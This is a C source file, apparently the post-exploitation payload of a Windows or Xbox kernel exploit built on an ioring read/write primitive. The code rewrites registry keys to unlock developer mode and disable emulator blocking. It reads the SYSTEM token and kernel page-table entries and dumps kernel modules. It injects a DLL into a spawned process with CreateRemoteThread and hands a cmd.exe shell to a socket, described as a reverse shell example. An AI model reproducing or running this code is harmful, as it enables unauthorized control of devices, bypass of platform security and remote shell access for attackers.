#include "post_exploit.h"
#include "win_defs.h"
#include "ioring.h"
#include "util.h"
#include "krnl_dumper.h"

#include <stdio.h>
#include <Windows.h>
#include <lmcons.h>
#include <metahost.h>
#include <ntstatus.h>
#include "nt_offsets.h"
#pragma comment(lib, "mscoree.lib")



char* sock_read(SOCKET sock) {
    char msg[1024] = { 0 };
    recv(sock, msg, 1024, MSG_PEEK);
}

void spawn_cmd(SOCKET sock) {
    // Spawn CMD using the socket for input and output
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);
    while (1) {}
}



BOOL set_reg() {
    DWORD dwMode = 1;
    LRESULT lResult;
    BOOL ret = TRUE;
    lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock", "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode, sizeof(dwMode));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Appx", "AllowDevelopmentWithoutDevLicense", REG_DWORD, &dwMode, sizeof(dwMode));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    DWORD dwDevUnlock = 4;
    lResult = lResult = RegSetKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\SOFTWARE\\Microsoft\\SecurityManager", "InternalDevUnlock", REG_DWORD, &dwDevUnlock, sizeof(dwDevUnlock));
    if (lResult != ERROR_SUCCESS) ret = FALSE;
    DWORD dwValue = 0;
    RegSetKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsEnabled", REG_DWORD, &dwValue, sizeof(dwValue));
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsRestrictedExeSubstrings");
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsLogOnlyExeSubstrings");
    RegDeleteKeyValue(HKEY_LOCAL_MACHINE, "OSDATA\\Software\\Microsoft\\Durango\\LiveSettings", "BlockEmulatorsPublisherPackageStrings");
    return ret;
}


int inject_dll(HANDLE hProcess, char* dllPath) {
    HMODULE hKernel32 = GetModuleHandle("KernelBase");
    if (!hKernel32)
        return -1;

    VOID* pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary)
        return -2;

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess,
        NULL,
        sizeof(dllPath) + 1,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (!pRemoteBuffer)
        return -3;

    if(!WriteProcessMemory(hProcess, pRemoteBuffer, dllPath, sizeof(dllPath) + 1, 0))
        return -4;

    HANDLE hRemoteThread = CreateRemoteThread(hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteBuffer,
        0,
        NULL);
    
    return 0;
}

BOOL FileExists(LPCTSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL match_sig(CHAR* buffer, CHAR* signature, SIZE_T signatureSize) {
    for (SIZE_T i = 0; i < signatureSize; i++) {
        if (signature[i] != 0xff && buffer[i] != signature[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

UINT64 kernel_sigscan(UINT64 baseAddress, UINT64 size, CHAR* signature, SIZE_T signatureSize) {
    if (baseAddress == NULL || size == 0 || signature == NULL || signatureSize == 0)
        return NULL;

    CHAR* buffer = (CHAR*)malloc(size);
    if (krnl_read(baseAddress, buffer, size) != 0) {
        free(buffer);
        return NULL;
    }

    for (SIZE_T i = 0; i <= size - signatureSize; i++) {
        if (match_sig(buffer + i, signature, signatureSize)) {
            return baseAddress + i;
        }
    }

    free(buffer);
    return NULL;
}



// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock, UINT64 ntBase)
{
    CHAR msg[1024] = { 0 };
    //char username[UNLEN + 1];
    //DWORD username_len = UNLEN + 1;
    //GetUsername(username, &username_len);

    sock_log(sock, "-hpayload\n");
    
    // add process hollowing, dll injection and manual mapping!

    
    int data = 1;
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"OSDATA\\Software\\Microsoft\\SecurityManager",
        L"InternalDevUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] InternalDevUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
        L"AppModelUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AppModelUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\Appx",
        L"AllowDevelopmentWithoutDevLicense",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AllowDevelopmentWithoutDevLicense enabled.\n");
    
    //CreateFileW("C:/Windows/System32/testing.txt", GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

    
    
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CHAR ptr_msg[1024] = { 0 };

    SYSTEM_INFO sysInfo;
    
    GetSystemInfo(&sysInfo);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] System page size: %lu\n", sysInfo.dwPageSize);
    sock_log(sock, ptr_msg);
    
    ULONG len;
    aSYSTEM_BASIC_INFORMATION sysBasicInfo;
    NtQuerySystemInformation(SystemBasicInformation, &sysBasicInfo, sizeof(sysBasicInfo), &len);

    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] Krnl System page size: %lu\n", sysBasicInfo.PageSize);
    sock_log(sock, ptr_msg);


    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] Reading SysToken from 0x%llx.\n[?] Tokens for reference: [systok:0x%llx,systok2:%llx]\n", ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, get_sys_token(), get_systok2());
    sock_log(sock, ptr_msg);
    // kernel rw sanity check (debug purposes for my dumb ass)
    ULONG64 sysToken = 0;
    int readRes = ioring_read(0x65007500, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &sysToken, sizeof(ULONG64));

    if (sysToken != get_sys_token()) {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "[!] SysToken reads don't match! readRes: %i [0x%llx/0x%llx/0x%llx]\n", readRes, sysToken, get_sys_token(), get_systok2());
        sock_log(sock, ptr_msg);
    }

    //set_pagetable_addr(sock, get_pagetable_address(sock, ntBase));

    UINT64 outi;
    MMPTE ntpte = get_pagetable_entry(ntBase, &outi);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] [0x%llx/%i] kernel base pte: %s\n", outi, ntpte.u.Hard.Valid, int64ToBinaryString(ntpte.u.Long));
    sock_log(sock, ptr_msg);

    //UINT64 pagetable = 
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] page table base addr: 0x%llx\n", get_pagetable_addr());
    sock_log(sock, ptr_msg);

    

    

    MMPTE pte = get_pagetable_entry(ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &outi);
    if (pte.u.Soft.Valid) {
        ULONGLONG prot = pte.u.Soft.Protection;
        sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] 0x%llx page info:\nProtection: %c%c%c%c%c\nValid: %i\nPageFileAllocated: %i\nPageFileReserved: %i\n",
            ullSystemEPROCaddr + EPROC_TOKEN_OFFSET,
            (prot & 0x01) ? '1' : '0',
            (prot & 0x02) ? '1' : '0',
            (prot & 0x04) ? '1' : '0',
            (prot & 0x08) ? '1' : '0',
            (prot & 0x10) ? '1' : '0',
            pte.u.Soft.Valid,
            pte.u.Soft.PageFileAllocated,
            pte.u.Soft.PageFileReserved);
        sock_log(sock, ptr_msg);
    }

    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] pte [%i/%ull]\n", pte.u.Soft.Valid, pte.u.Soft.Protection);
    sock_log(sock, ptr_msg);

    char out[256] = { 0 }; // probably should malloc this ngl
    hex_dump(&pte, sizeof(MMPTE), out);

    sprintf_s(ptr_msg,
        sizeof(ptr_msg),
        "[?] PTE:\n%s\n", out);
    sock_log(sock, ptr_msg);
    /*for (SIZE_T i = 0; i < sizeof(dump); i++) {
        sprintf_s(ptr_msg,
            sizeof(ptr_msg),
            "%hhx", dump[i]);
        sock_log(s, ptr_msg);
    }
    sock_log(s, "\n");*/

    UINT64 kthreadAddr = __readgsqword(0x188); // checking if it works :o
    DWORD lastStatus = __readgsdword(0x1250);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] lastStatus: 0x%x, kthreadAddr: 0x%llx\n", lastStatus, kthreadAddr);
    sock_log(sock, ptr_msg);

    dump_kmodules(sock);

    // kernel rw no longer needed, so do some laundry
    ioring_cleanup();

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "D:\\", &sinfo, &pinfo);
    int res = inject_dll(pinfo.hProcess, "D:\\testdll.dll");
    sprintf_s(ptr_msg, sizeof(ptr_msg), "[?] dll injection returned: %i\n", res);
    sock_log(sock, ptr_msg);



    while (1) {}
    
}
